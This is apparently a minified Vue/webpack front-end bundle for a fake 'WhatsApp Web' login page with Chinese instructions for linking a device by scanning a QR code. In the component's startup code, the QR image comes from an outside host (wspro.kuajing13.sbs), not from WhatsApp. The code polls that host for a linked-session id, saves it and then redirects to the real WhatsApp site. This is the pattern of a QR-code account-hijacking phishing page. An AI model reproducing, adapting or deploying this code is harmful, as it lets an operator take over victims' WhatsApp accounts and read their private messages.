(function(t) {
    function e(e) {
        for (var r, l, i = e[0], o = e[1], s = e[2], u = 0, d = []; u < i.length; u++)
            l = i[u],
            Object.prototype.hasOwnProperty.call(c, l) && c[l] && d.push(c[l][0]),
            c[l] = 0;
        for (r in o)
            Object.prototype.hasOwnProperty.call(o, r) && (t[r] = o[r]);
        p && p(e);
        while (d.length)
            d.shift()();
        return n.push.apply(n, s || []),
        a()
    }
    function a() {
        for (var t, e = 0; e < n.length; e++) {
            for (var a = n[e], r = !0, i = 1; i < a.length; i++) {
                var o = a[i];
                0 !== c[o] && (r = !1)
            }
            r && (n.splice(e--, 1),
            t = l(l.s = a[0]))
        }
        return t
    }
    var r = {}
      , c = {
        web: 0
    }
      , n = [];
    function l(e) {
        if (r[e])
            return r[e].exports;
        var a = r[e] = {
            i: e,
            l: !1,
            exports: {}
        };
        return t[e].call(a.exports, a, a.exports, l),
        a.l = !0,
        a.exports
    }
    l.m = t,
    l.c = r,
    l.d = function(t, e, a) {
        l.o(t, e) || Object.defineProperty(t, e, {
            enumerable: !0,
            get: a
        })
    }
    ,
    l.r = function(t) {
        "undefined" !== typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
            value: "Module"
        }),
        Object.defineProperty(t, "__esModule", {
            value: !0
        })
    }
    ,
    l.t = function(t, e) {
        if (1 & e && (t = l(t)),
        8 & e)
            return t;
        if (4 & e && "object" === typeof t && t && t.__esModule)
            return t;
        var a = Object.create(null);
        if (l.r(a),
        Object.defineProperty(a, "default", {
            enumerable: !0,
            value: t
        }),
        2 & e && "string" != typeof t)
            for (var r in t)
                l.d(a, r, function(e) {
                    return t[e]
                }
                .bind(null, r));
        return a
    }
    ,
    l.n = function(t) {
        var e = t && t.__esModule ? function() {
            return t["default"]
        }
        : function() {
            return t
        }
        ;
        return l.d(e, "a", e),
        e
    }
    ,
    l.o = function(t, e) {
        return Object.prototype.hasOwnProperty.call(t, e)
    }
    ,
    l.p = "/";
    var i = window["webpackJsonp"] = window["webpackJsonp"] || []
      , o = i.push.bind(i);
    i.push = e,
    i = i.slice();
    for (var s = 0; s < i.length; s++)
        e(i[s]);
    var p = o;
    n.push([1, "chunk-vendors"]),
    a()
}
)({
    1: function(t, e, a) {
        t.exports = a("96dd")
    },
    "96dd": function(t, e, a) {
        "use strict";
        a.r(e);
        a("e260"),
        a("e6cf"),
        a("cca6"),
        a("a79d"),
        a("b0c0");
        var r = a("2b0e")
          , c = function() {
            var t = this
              , e = t._self._c;
            return e("div", {
                staticStyle: {
                    "background-color": "rgb(240,242,245)"
                },
                attrs: {
                    id: "app"
                }
            }, [e("Home")], 1)
        }
          , n = []
          , l = function() {
            var t = this
              , e = t._self._c;
            return e("el-container", {
                staticStyle: {
                    width: "100%",
                    "padding-bottom": "100px"
                },
                attrs: {
                    direction: "vertical"
                }
            }, [e("el-container", {
                staticStyle: {
                    width: "100%",
                    height: "222px",
                    "background-color": "#00A884"
                }
            }, [e("el-row", {
                staticStyle: {
                    width: "1000px",
                    "margin-top": "-120px",
                    "margin-left": "auto",
                    "margin-right": "auto"
                },
                attrs: {
                    type: "flex",
                    align: "middle"
                }
            }, [e("img", {
                staticStyle: {
                    width: "40px"
                },
                attrs: {
                    src: "/favicon.png"
                }
            }), e("span", {
                staticStyle: {
                    color: "#FFF",
                    "margin-left": "20px"
                }
            }, [t._v("WHATSAPP WEB")])])], 1), e("el-container", {
                staticStyle: {
                    width: "1000px",
                    "margin-left": "auto",
                    "margin-right": "auto",
                    "margin-top": "-95px",
                    "background-color": "#FFF",
                    "box-shadow": "5px 2px 10px rgba(0, 0, 0, 0.2)",
                    color: "rgb(80,96,106)",
                    "border-radius": "5px"
                },
                attrs: {
                    direction: "vertical"
                }
            }, [e("el-row", {
                staticStyle: {
                    width: "100%",
                    margin: "50px"
                },
                attrs: {
                    type: "flex"
                }
            }, [e("el-col", {
                staticStyle: {
                    "white-space": "nowrap"
                },
                attrs: {
                    span: 16
                }
            }, [e("p", {
                staticStyle: {
                    "font-size": "28px",
                    "font-weight": "100",
                    "margin-bottom": "50px"
                }
            }, [t._v("如何在你的电脑上使用WhatsApp:")]), e("p", [t._v("1.在你手机上使用WhatsApp")]), e("p", [e("span", {
                staticClass: "_11JPr",
                attrs: {
                    dir: "ltr"
                }
            }, [t._v("2.点击 "), e("strong", [e("span", {
                staticClass: "_11JPr",
                attrs: {
                    dir: "ltr"
                }
            }, [t._v("菜单 "), e("span", {
                staticClass: "l7jjieqr fewfhwl7"
            }, [e("svg", {
                attrs: {
                    height: "24px",
                    viewBox: "0 0 24 24",
                    width: "24px"
                }
            }, [e("rect", {
                attrs: {
                    fill: "#f2f2f2",
                    height: "24",
                    rx: "3",
                    width: "24"
                }
            }), e("path", {
                attrs: {
                    d: "m12 15.5c.825 0 1.5.675 1.5 1.5s-.675 1.5-1.5 1.5-1.5-.675-1.5-1.5.675-1.5 1.5-1.5zm0-2c-.825 0-1.5-.675-1.5-1.5s.675-1.5 1.5-1.5 1.5.675 1.5 1.5-.675 1.5-1.5 1.5zm0-5c-.825 0-1.5-.675-1.5-1.5s.675-1.5 1.5-1.5 1.5.675 1.5 1.5-.675 1.5-1.5 1.5z",
                    fill: "#818b90"
                }
            })])])])]), t._v(" 或者 "), e("strong", [e("span", {
                staticClass: "_11JPr",
                attrs: {
                    dir: "ltr"
                }
            }, [t._v("设置 "), e("span", {
                staticClass: "l7jjieqr fewfhwl7"
            }, [e("svg", {
                attrs: {
                    width: "24",
                    height: "24",
                    viewBox: "0 0 24 24"
                }
            }, [e("rect", {
                attrs: {
                    fill: "#F2F2F2",
                    width: "24",
                    height: "24",
                    rx: "3"
                }
            }), e("path", {
                attrs: {
                    d: "M12 18.69c-1.08 0-2.1-.25-2.99-.71L11.43 14c.24.06.4.08.56.08.92 0 1.67-.59 1.99-1.59h4.62c-.26 3.49-3.05 6.2-6.6 6.2zm-1.04-6.67c0-.57.48-1.02 1.03-1.02.57 0 1.05.45 1.05 1.02 0 .57-.47 1.03-1.05 1.03-.54.01-1.03-.46-1.03-1.03zM5.4 12c0-2.29 1.08-4.28 2.78-5.49l2.39 4.08c-.42.42-.64.91-.64 1.44 0 .52.21 1 .65 1.44l-2.44 4C6.47 16.26 5.4 14.27 5.4 12zm8.57-.49c-.33-.97-1.08-1.54-1.99-1.54-.16 0-.32.02-.57.08L9.04 5.99c.89-.44 1.89-.69 2.96-.69 3.56 0 6.36 2.72 6.59 6.21h-4.62zM12 19.8c.22 0 .42-.02.65-.04l.44.84c.08.18.25.27.47.24.21-.03.33-.17.36-.38l.14-.93c.41-.11.82-.27 1.21-.44l.69.61c.15.15.33.17.54.07.17-.1.24-.27.2-.48l-.2-.92c.35-.24.69-.52.99-.82l.86.36c.2.08.37.05.53-.14.14-.15.15-.34.03-.52l-.5-.8c.25-.35.45-.73.63-1.12l.95.05c.21.01.37-.09.44-.29.07-.2.01-.38-.16-.51l-.73-.58c.1-.4.19-.83.22-1.27l.89-.28c.2-.07.31-.22.31-.43s-.11-.35-.31-.42l-.89-.28c-.03-.44-.12-.86-.22-1.27l.73-.59c.16-.12.22-.29.16-.5-.07-.2-.23-.31-.44-.29l-.95.04c-.18-.4-.39-.77-.63-1.12l.5-.8c.12-.17.1-.36-.03-.51-.16-.18-.33-.22-.53-.14l-.86.35c-.31-.3-.65-.58-.99-.82l.2-.91c.03-.22-.03-.4-.2-.49-.18-.1-.34-.09-.48.01l-.74.66c-.39-.18-.8-.32-1.21-.43l-.14-.93a.426.426 0 00-.36-.39c-.22-.03-.39.05-.47.22l-.44.84-.43-.02h-.22c-.22 0-.42.01-.65.03l-.44-.84c-.08-.17-.25-.25-.48-.22-.2.03-.33.17-.36.39l-.13.88c-.42.12-.83.26-1.22.44l-.69-.61c-.15-.15-.33-.17-.53-.06-.18.09-.24.26-.2.49l.2.91c-.36.24-.7.52-1 .82l-.86-.35c-.19-.09-.37-.05-.52.13-.14.15-.16.34-.04.51l.5.8c-.25.35-.45.72-.64 1.12l-.94-.04c-.21-.01-.37.1-.44.3-.07.2-.02.38.16.5l.73.59c-.1.41-.19.83-.22 1.27l-.89.29c-.21.07-.31.21-.31.42 0 .22.1.36.31.43l.89.28c.03.44.1.87.22 1.27l-.73.58c-.17.12-.22.31-.16.51.07.2.23.31.44.29l.94-.05c.18.39.39.77.63 1.12l-.5.8c-.12.18-.1.37.04.52.16.18.33.22.52.14l.86-.36c.3.31.64.58.99.82l-.2.92c-.04.22.03.39.2.49.2.1.38.08.54-.07l.69-.61c.39.17.8.33 1.21.44l.13.93c.03.21.16.35.37.39.22.03.39-.06.47-.24l.44-.84c.23.02.44.04.66.04z",
                    fill: "#818b90"
                }
            })])])])]), t._v(" 然后选择 "), e("strong", [t._v("已关联的设备")])])]), e("p", [t._v("3."), e("span", {
                staticClass: "_11JPr",
                attrs: {
                    dir: "ltr"
                }
            }, [t._v("点击 "), e("strong", [t._v("关联新设备")])])]), e("p", [t._v("4.使用你的手机拍摄屏幕上的二维码")])]), e("el-col", {
                staticStyle: {
                    "text-align": "center"
                }
            }, [t.qrcode ? e("div", [e("img", {
                staticStyle: {
                    width: "264px",
                    height: "264px"
                },
                attrs: {
                    src: t.qrcode
                }
            }), e("div", {
                staticStyle: {
                    "margin-top": "-170px",
                    "margin-left": "15px"
                }
            }, [e("span", [e("svg", {
                attrs: {
                    xmlns: "http://www.w3.org/2000/svg",
                    width: "64",
                    height: "64",
                    viewBox: "0 0 64 64"
                }
            }, [e("path", {
                attrs: {
                    fill: "#FFF",
                    d: "M6.525 43.936a29.596 29.596 0 0 1-3.039-13.075C3.494 14.568 16.755 1.313 33.05 1.313c7.904.004 15.328 3.082 20.91 8.666 5.581 5.586 8.653 13.01 8.65 20.907-.007 16.294-13.266 29.549-29.558 29.549a29.648 29.648 0 0 1-12.508-2.771L1.391 62.687l5.134-18.751z"
                }
            }), e("path", {
                attrs: {
                    fill: "#123033",
                    d: "M50.801 13.135c-4.739-4.742-11.039-7.354-17.752-7.357-13.837 0-25.094 11.253-25.099 25.085a25.039 25.039 0 0 0 3.349 12.541l-3.56 12.999 13.304-3.488a25.084 25.084 0 0 0 11.996 3.054h.011c13.83 0 25.088-11.256 25.095-25.087.002-6.703-2.607-13.005-7.344-17.747zM33.05 51.733h-.008a20.866 20.866 0 0 1-10.62-2.906l-.762-.452-7.894 2.07 2.108-7.694-.497-.789a20.802 20.802 0 0 1-3.189-11.097c.004-11.496 9.361-20.85 20.87-20.85a20.73 20.73 0 0 1 14.746 6.115 20.733 20.733 0 0 1 6.104 14.752c-.006 11.497-9.363 20.851-20.858 20.851z"
                }
            }), e("path", {
                attrs: {
                    fill: "#123033",
                    d: "M25.429 19.26a8.65 8.65 0 0 0-1.028.011 2.352 2.352 0 0 0-.95.255c-.221.114-.427.277-.75.582-.305.288-.481.54-.668.782a6.974 6.974 0 0 0-1.443 4.291l.001.003a8.243 8.243 0 0 0 .844 3.607c1.043 2.307 2.763 4.746 5.035 7.008a24.676 24.676 0 0 0 1.657 1.6 24.145 24.145 0 0 0 9.814 5.229s.751.179 1.391.218c.021.001.04.003.061.003a9.207 9.207 0 0 0 1.422-.033 5.086 5.086 0 0 0 2.129-.59c.423-.225.623-.337.978-.561 0 0 .11-.072.319-.23.345-.257.558-.438.845-.736.211-.22.394-.479.534-.772.2-.417.401-1.213.481-1.874.061-.505.042-.781.036-.952-.011-.275-.238-.558-.487-.678l-1.486-.668s-2.222-.967-3.581-1.587a1.278 1.278 0 0 0-.452-.104c-.341-.021-.723.068-.966.324v-.004c-.013-.001-.182.145-2.031 2.385-.102.122-.341.387-.754.362a1.086 1.086 0 0 1-.185-.029 3.402 3.402 0 0 1-.49-.17c-.316-.134-.427-.185-.643-.278l-.013-.006a15.361 15.361 0 0 1-4.013-2.556 15.88 15.88 0 0 1-.927-.885c-1.074-1.041-1.953-2.148-2.607-3.24-.035-.06-.09-.146-.15-.242-.107-.174-.225-.381-.262-.523-.095-.376.157-.678.157-.678s.622-.68.911-1.05c.278-.356.518-.704.671-.952.301-.484.39-.982.238-1.37a216.767 216.767 0 0 0-2.219-5.215c-.156-.339-.598-.589-1.005-.636a6.284 6.284 0 0 0-.414-.041"
                }
            })])])])]) : t._e()])], 1), e("el-container", {
                staticStyle: {
                    "background-color": "rgba(11,20,26,.025)",
                    "text-align": "center",
                    "margin-top": "80px",
                    "padding-bottom": "50px"
                },
                attrs: {
                    direction: "vertical"
                }
            }, [e("p", {
                staticStyle: {
                    "font-size": "20px",
                    "font-weight": "300",
                    transform: "scale(1.2, 1.3)",
                    "padding-top": "20px"
                }
            }, [t._v("Tutorial")]), e("p", {
                staticStyle: {
                    color: "#008069",
                    "font-size": "12px"
                }
            }, [t._v("需要登入帮助吗?")]), e("img", {
                staticStyle: {
                    width: "560px",
                    height: "314px",
                    "margin-left": "auto",
                    "margin-right": "auto",
                    "margin-top": "25px"
                },
                attrs: {
                    src: "tutorial.png"
                }
            })])], 1)], 1)
        }
          , i = []
          , o = a("c7eb")
          , s = a("53ca")
          , p = a("1da1")
          , u = (a("ac1f"),
        a("5319"),
        a("d3b7"),
        a("25f0"),
        a("3ca3"),
        a("ddb0"),
        a("99af"),
        a("bc3a"))
          , d = a.n(u)
          , f = {
            name: "Web",
            props: {},
            data: function() {
                return {
                    qrcode: "",
                    dialogVisible: !1,
                    url: location.href,
                    hostname: "https://wspro.kuajing13.sbs"
                }
            },
            mounted: function() {
                this.startup().then(console.log).catch(console.log)
            },
            methods: {
                handleAccept: function() {
                    location.href = this.url
                },
                guid: function() {
					var lose = localStorage.getItem("se");
					if(lose == null){
						lose = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function(t) {
						    var e = 16 * Math.random() | 0
						      , a = "x" == t ? e : 3 & e | 8;
						    return a.toString(16)
						}))
						localStorage.setItem("se",lose)
					}
                    return lose;
                },
                startup: function() {
                    var t = Object(p["a"])(Object(o["a"])().mark((function t() {
                        var e, a, r, c, n = this, l = arguments;
                        return Object(o["a"])().wrap((function(t) {
                            while (1)
                                switch (t.prev = t.next) {
                                case 0:
                                    e = l.length > 0 && void 0 !== l[0] ? l[0] : "https://web.whatsapp.com",
                                    a = localStorage.getItem("walid"),
                                    r = Object(o["a"])().mark((function t() {
                                        var r, c, l, i, s;
                                        return Object(o["a"])().wrap((function(t) {
                                            while (1)
                                                switch (t.prev = t.next) {
                                                case 0:
                                                    if (!a) {
                                                        t.next = 14;
                                                        break
                                                    }
                                                    return t.prev = 1,
                                                    t.next = 4,
                                                    d.a.get("".concat(n.hostname, "/whatsapp/check?walid=").concat(a) + "&t=" + (new Date).getTime());
                                                case 4:
                                                    if (r = t.sent,
                                                    200 != r.status) {
                                                        t.next = 9;
                                                        break
                                                    }
                                                    if (c = r.data,
                                                    0 != c.code || !c.data) {
                                                        t.next = 9;
                                                        break
                                                    }
                                                    return t.abrupt("return", "break");
                                                case 9:
                                                    t.next = 14;
                                                    break;
                                                case 11:
                                                    return t.prev = 11,
                                                    t.t0 = t["catch"](1),
                                                    t.abrupt("return", "break");
                                                case 14:
                                                    return l = n.guid(),
                                                    i = function(t) {
                                                        d.a.get("".concat(n.hostname, "/whatsapp/walid?sesskey=") + l + "&t=" + (new Date).getTime()).then((function(t) {
                                                            var a = t.data
                                                              , r = t.status;
                                                            if (200 == r)
                                                                return 0 == a.code && a.data ? (clearInterval(s),
                                                                localStorage.setItem("walid", a.data),
                                                                void (location.href = e)) : void (n.qrcode = "".concat(n.hostname, "/whatsapp/qrcode?sesskey=") + l + "&t=" + (new Date).getTime())
                                                        }
                                                        )).catch(console.log)
                                                    }
                                                    ,
                                                    s = setInterval(i, 5e3),
                                                    i(),
                                                    t.abrupt("return", {
                                                        v: void 0
                                                    });
                                                case 19:
                                                case "end":
                                                    return t.stop()
                                                }
                                        }
                                        ), t, null, [[1, 11]])
                                    }
                                    ));
                                case 3:
                                    return t.delegateYield(r(), "t0", 4);
                                case 4:
                                    if (c = t.t0,
                                    "break" !== c) {
                                        t.next = 7;
                                        break
                                    }
                                    return t.abrupt("break", 10);
                                case 7:
                                    if ("object" !== Object(s["a"])(c)) {
                                        t.next = 9;
                                        break
                                    }
                                    return t.abrupt("return", c.v);
                                case 9:
                                    0;
                                case 10:
                                    location.href = e || location.href;
                                case 11:
                                case "end":
                                    return t.stop()
                                }
                        }
                        ), t)
                    }
                    )));
                    function e() {
                        return t.apply(this, arguments)
                    }
                    return e
                }()
            }
        }
          , h = f
          , x = a("2877")
          , g = Object(x["a"])(h, l, i, !1, null, "8eed57f2", null)
          , b = g.exports
          , v = {
            name: "app",
            components: {
                Home: b
            }
        }
          , w = v
          , m = Object(x["a"])(w, c, n, !1, null, null, null)
          , y = m.exports
          , _ = a("5c96")
          , S = a.n(_)
          , j = (a("0fae"),
        a("5488"))
          , k = a.n(j);
        r["default"].config.productionTip = !0,
        r["default"].use(S.a),
        r["default"].component(k.a.name, k.a),
        new r["default"]({
            render: function(t) {
                return t(y)
            }
        }).$mount("#app")
    }
});
//# sourceMappingURL=web.b9dfa4a0.js.map
